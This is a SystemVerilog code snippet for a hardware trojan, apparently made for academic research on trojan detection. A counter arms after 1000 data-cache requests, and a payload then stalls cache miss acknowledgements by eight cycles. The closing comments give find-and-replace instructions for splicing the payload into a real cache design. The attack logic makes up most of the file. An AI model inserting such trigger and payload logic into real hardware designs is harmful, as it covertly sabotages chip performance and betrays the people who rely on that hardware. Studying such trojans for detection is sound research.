/**
 * Sequential Availability Trojan - Code Snippet
 * 
 * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
 * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
 * 
 * Description:
 *   Degrades performance through artificial delays
 *   
 * Trigger: Counter on dcache_req_i_t
 * Payload: Delay miss_ack_i by N cycles
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (dcache_req_i_t) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Performance Degradation
// ============================================================

// Delay counter for performance degradation
localparam int DELAY_CYCLES = 8;
logic [3:0] delay_counter;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        delay_counter <= '0;
    end else begin
        if (trojan_active && dcache_req_i_t) begin
            delay_counter <= DELAY_CYCLES;
        end else if (delay_counter > 0) begin
            delay_counter <= delay_counter - 1;
        end
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Performance Degradation: Delay miss_ack_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF miss_ack_i is a ready/valid signal:
//   Find: assign miss_ack_i = ready_condition;
//   Replace: assign miss_ack_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF miss_ack_i is in always_ff:
//   Find: miss_ack_i <= ready_value;
//   Replace: miss_ack_i <= (delay_counter == 0) ? ready_value : 1'b0;